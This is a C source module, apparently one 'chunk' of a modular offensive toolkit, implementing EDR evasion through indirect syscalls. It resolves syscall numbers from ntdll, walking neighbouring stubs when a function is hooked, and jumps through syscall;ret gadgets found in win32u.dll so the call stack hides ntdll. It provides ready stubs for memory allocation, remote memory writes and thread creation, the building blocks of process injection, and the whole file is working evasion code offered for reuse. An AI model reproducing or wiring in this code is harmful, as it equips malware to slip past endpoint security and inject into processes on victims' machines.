// chunk: evasion/syscall_win32u
// depends: (none)
// provides: init_indirect_syscalls, indirect_NtAllocateVirtualMemory, indirect_NtWriteVirtualMemory, indirect_NtCreateThreadEx, indirect_NtQuerySystemInformation
// headers: windows.h
// risk: medium
// note: win32u.dll syscall routing — EDRs typically hook ntdll but NOT win32u.dll. This loads win32u.dll, finds its syscall;ret gadgets, then resolves SSNs from ntdll but executes through win32u's clean stubs. The return address in the call stack points to win32u instead of ntdll, evading ntdll-specific stack checks.

#ifndef CHUNK_SYSCALL_WIN32U
#define CHUNK_SYSCALL_WIN32U

static DWORD ssn_NtAllocateVirtualMemory = 0;
static DWORD ssn_NtWriteVirtualMemory = 0;
static DWORD ssn_NtCreateThreadEx = 0;
static DWORD ssn_NtQuerySystemInformation = 0;
static void *syscall_ret_gadget = NULL;

static int w32u_is_clean(BYTE *code) {
    return (code[0] == 0x4C && code[1] == 0x8B && code[2] == 0xD1 && code[3] == 0xB8);
}

static DWORD w32u_resolve_ssn(HMODULE ntdll, const char *func_name) {
    BYTE *base = (BYTE *)ntdll;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    DWORD exp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exp_rva) return 0;

    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(base + exp_rva);
    DWORD *names = (DWORD *)(base + exp->AddressOfNames);
    WORD *ords = (WORD *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *name = (char *)(base + names[i]);
        if (strcmp(name, func_name) == 0) {
            BYTE *code = base + funcs[ords[i]];
            if (w32u_is_clean(code))
                return *(DWORD *)(code + 4);

            // Hooked — walk neighbors
            for (int d = 1; d < 500; d++) {
                if (i + d < exp->NumberOfNames) {
                    char *n = (char *)(base + names[i + d]);
                    if (n[0] == 'N' && n[1] == 't') {
                        BYTE *c = base + funcs[ords[i + d]];
                        if (w32u_is_clean(c))
                            return *(DWORD *)(c + 4) - d;
                    }
                }
                if (i >= (DWORD)d) {
                    char *n = (char *)(base + names[i - d]);
                    if (n[0] == 'N' && n[1] == 't') {
                        BYTE *c = base + funcs[ords[i - d]];
                        if (w32u_is_clean(c))
                            return *(DWORD *)(c + 4) + d;
                    }
                }
            }
            return 0;
        }
    }
    return 0;
}

static void *w32u_find_gadget_in_win32u(HMODULE win32u) {
    BYTE *base = (BYTE *)win32u;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            BYTE *start = base + sec[i].VirtualAddress;
            DWORD size = sec[i].Misc.VirtualSize;
            for (DWORD j = 0; j < size - 2; j++) {
                if (start[j] == 0x0F && start[j + 1] == 0x05 && start[j + 2] == 0xC3)
                    return (void *)(start + j);
            }
        }
    }
    return NULL;
}

static int init_indirect_syscalls(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    // Load win32u.dll — it's typically loaded in GUI processes but we force it
    HMODULE win32u = LoadLibraryA("win32u.dll");
    if (!win32u) {
        // Fallback: use ntdll gadget if win32u unavailable
        BYTE *base = (BYTE *)ntdll;
        IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
        IMAGE_NT_HEADERS *nthdr = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
        IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nthdr);
        for (WORD i = 0; i < nthdr->FileHeader.NumberOfSections; i++) {
            if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
                BYTE *start = base + sec[i].VirtualAddress;
                DWORD sz = sec[i].Misc.VirtualSize;
                for (DWORD j = 0; j < sz - 2; j++) {
                    if (start[j] == 0x0F && start[j+1] == 0x05 && start[j+2] == 0xC3) {
                        syscall_ret_gadget = (void *)(start + j);
                        goto resolve_ssns;
                    }
                }
            }
        }
        return 0;
    } else {
        syscall_ret_gadget = w32u_find_gadget_in_win32u(win32u);
        if (!syscall_ret_gadget) return 0;
    }

resolve_ssns:
    ssn_NtAllocateVirtualMemory = w32u_resolve_ssn(ntdll, "NtAllocateVirtualMemory");
    ssn_NtWriteVirtualMemory    = w32u_resolve_ssn(ntdll, "NtWriteVirtualMemory");
    ssn_NtCreateThreadEx        = w32u_resolve_ssn(ntdll, "NtCreateThreadEx");
    ssn_NtQuerySystemInformation = w32u_resolve_ssn(ntdll, "NtQuerySystemInformation");

    return (ssn_NtAllocateVirtualMemory != 0 &&
            ssn_NtWriteVirtualMemory != 0 &&
            ssn_NtCreateThreadEx != 0 &&
            ssn_NtQuerySystemInformation != 0) ? 1 : 0;
}

__attribute__((naked))
static NTSTATUS indirect_NtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtAllocateVirtualMemory(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

__attribute__((naked))
static NTSTATUS indirect_NtWriteVirtualMemory(
    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
    SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtWriteVirtualMemory(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

__attribute__((naked))
static NTSTATUS indirect_NtCreateThreadEx(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument,
    ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize,
    SIZE_T MaximumStackSize, PVOID AttributeList) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtCreateThreadEx(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

__attribute__((naked))
static NTSTATUS indirect_NtQuerySystemInformation(
    ULONG SystemInformationClass, PVOID SystemInformation,
    ULONG SystemInformationLength, PULONG ReturnLength) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtQuerySystemInformation(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

#endif
